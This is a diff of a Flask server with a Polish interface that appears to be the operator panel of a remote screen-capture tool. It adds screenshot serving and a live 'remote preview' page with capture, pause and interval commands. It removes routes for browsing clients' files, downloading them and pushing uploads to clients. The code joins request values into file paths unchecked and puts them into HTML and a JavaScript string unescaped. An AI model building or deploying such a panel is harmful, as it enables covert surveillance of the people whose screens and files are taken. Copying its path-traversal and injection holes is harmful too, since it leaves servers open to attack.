@@ -18,8 +18,21 @@ os.makedirs(UPLOADS_TO_CLIENTS, exist_ok=True)
 def index():
     users = os.listdir(UPLOAD_FOLDER)
     users = [u for u in users if os.path.isdir(os.path.join(UPLOAD_FOLDER, u))]
-    links = "".join([f'<li><a href="/view?user={u}">{u}</a> | <a href="/files?user={u}">Pliki</a> | <a href="/upload_file?user={u}">Wyślij plik</a> | <a href="/screens_list?user={u}">Screeny</a></li>' for u in users])
+    links = "".join([
+        f'<li><a href="/view?user={u}">{u}</a> | '
+        f'<a href="/files?user={u}">Pliki</a> | '
+        f'<a href="/upload_file?user={u}">Wyślij plik</a> | '
+        f'<a href="/screens_list?user={u}">Screeny</a></li>'
+        for u in users
+    ])
     return f"<h1>Dostępni użytkownicy</h1><ul>{links}</ul>"
+
+@app.route("/screens/<user>/<filename>")
+def get_screen(user, filename):
+    path = os.path.join(UPLOAD_FOLDER, user, filename)
+    if not os.path.exists(path):
+        return "Nie znaleziono screena", 404
+    return send_file(path, mimetype='image/png')
 
 @app.route("/screens_list")
 def screens_list():
@@ -31,96 +44,67 @@ def screens_list():
     files = sorted(os.listdir(folder))
     content = f"<h1>Screeny: {user}</h1><ul>"
     for f in files:
-        ts = f.replace("screenshot_", "").replace(".png", "").replace("_", " ").replace("-", ":", 2)
+        ts = f.replace("screenshot_", "").replace(".png", "").replace("_", " ")
         link = f"/screens/{user}/{f}"
         content += f'<li><a href="{link}" target="_blank">{ts}</a></li>'
     content += "</ul>"
     return content
 
-@app.route("/files")
-def files():
+@app.route("/view")
+def view():
     user = request.args.get("user")
-    path = request.args.get("path", "")
-    base_path = os.path.join(FILES_FOLDER, user)
-    full_path = os.path.join(base_path, path)
+    if not user:
+        return redirect(url_for("index"))
+    return render_template_string('''
+        <html>
+        <head>
+            <title>Zdalny Podgląd - {{ user }}</title>
+            <style>
+                body { background: #111; color: white; text-align: center; font-family: sans-serif; }
+                img { max-width: 90%; border: 2px solid white; margin: 10px auto; display: block; }
+                .panel { margin-top: 20px; }
+                button { margin: 5px; padding: 10px 20px; font-size: 16px; cursor: pointer; }
+                .status-box { margin-top: 20px; padding: 10px; background: #222; border: 1px solid #555; display: inline-block; }
+            </style>
+            <script>
+                const user = "{{ user }}";
+                async function sendCommand(action) {
+                    await fetch("/command?user=" + user, {
+                        method: "POST",
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: "action=" + action
+                    });
+                    updateStatus();
+                }
 
-    if not os.path.exists(full_path):
-        return "Ścieżka nie istnieje", 404
+                async function updateStatus() {
+                    const res = await fetch("/command?user=" + user);
+                    const data = await res.json();
+                    document.getElementById("status").innerText = `Status: ${data.paused ? 'Zatrzymany' : 'Aktywny'} | Interwał: ${data.interval}s`;
+                }
 
-    entries = os.listdir(full_path)
-    content = f"<h1>Pliki: {user} - {path or '/'} </h1><ul>"
-    if path:
-        parent = os.path.dirname(path.rstrip("/"))
-        content += f'<li><a href="/files?user={user}&path={parent}">[..]</a></li>'
-    for e in entries:
-        p = os.path.join(path, e).replace("\\", "/")
-        fpath = os.path.join(full_path, e)
-        if os.path.isdir(fpath):
-            content += f'<li>[<b>DIR</b>] <a href="/files?user={user}&path={p}">{e}</a></li>'
-        else:
-            content += f'<li><a href="/download?user={user}&path={p}">{e}</a></li>'
-    content += "</ul>"
-    return content
+                setInterval(updateStatus, 3000);
+                window.onload = updateStatus;
+            </script>
+        </head>
+        <body>
+            <h1>📸 Podgląd Ekranu: {{ user }}</h1>
+            <img src="/latest?user={{ user }}" />
 
-@app.route("/download")
-def download():
-    user = request.args.get("user")
-    path = request.args.get("path")
-    full_path = os.path.join(FILES_FOLDER, user, path)
-    if not os.path.exists(full_path):
-        return "Nie znaleziono pliku", 404
-    return send_file(full_path, as_attachment=True)
+            <div class="panel">
+                <button onclick="sendCommand('one_shot')">Zrób screena teraz</button>
+                <button onclick="sendCommand('pause')">Pauza</button>
+                <button onclick="sendCommand('resume')">Start</button>
+                <button onclick="sendCommand('faster')">Szybciej</button>
+                <button onclick="sendCommand('slower')">Wolniej</button>
+            </div>
 
-@app.route("/upload_file", methods=['GET', 'POST'])
-def upload_file():
-    user = request.args.get("user")
-    user_folder = os.path.join(UPLOADS_TO_CLIENTS, user)
-    os.makedirs(user_folder, exist_ok=True)
-
-    if request.method == 'POST':
-        uploaded_file = request.files['file']
-        if uploaded_file.filename:
-            filepath = os.path.join(user_folder, uploaded_file.filename)
-            uploaded_file.save(filepath)
-            return f"Plik {uploaded_file.filename} został przesłany do użytkownika {user}."
-
-    return f'''
-        <h1>Wyślij plik do użytkownika: {user}</h1>
-        <form method="POST" enctype="multipart/form-data">
-            <input type="file" name="file" />
-            <input type="submit" value="Wyślij" />
-        </form>
-    '''
-
-@app.route("/uploaded_files/<user>/<filename>")
-def uploaded_file(user, filename):
-    path = os.path.join(UPLOADS_TO_CLIENTS, user, filename)
-    if os.path.exists(path):
-        return send_file(path, as_attachment=True)
-    return "Nie znaleziono pliku", 404
-
-@app.route("/sync_files", methods=["POST"])
-def sync_files():
-    user = request.form.get("user")
-    tree_raw = request.form.get("tree")
-    if not user or not tree_raw:
-        return "Brak danych", 400
-
-    try:
-        tree = json.loads(tree_raw)
-        user_path = os.path.join(FILES_FOLDER, user)
-        for rel_path in tree:
-            full_path = os.path.join(user_path, rel_path)
-            if rel_path.endswith("/"):
-                os.makedirs(full_path, exist_ok=True)
-            else:
-                dir_path = os.path.dirname(full_path)
-                os.makedirs(dir_path, exist_ok=True)
-                with open(full_path, "w") as f:
-                    f.write("")  # tworzymy pusty plik jako placeholder
-        return "OK"
-    except Exception as e:
-        return f"Błąd synchronizacji: {e}", 500
+            <div class="status-box" id="status">
+                Status: ładowanie...
+            </div>
+        </body>
+        </html>
+    ''', user=user)
 
 @app.route("/latest")
 def latest():
@@ -184,7 +168,3 @@ def command():
             return jsonify({"paused": False, "interval": 5})
         with open(command_path, "r") as f:
             return jsonify(json.load(f))
-
-if __name__ == '__main__':
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port)
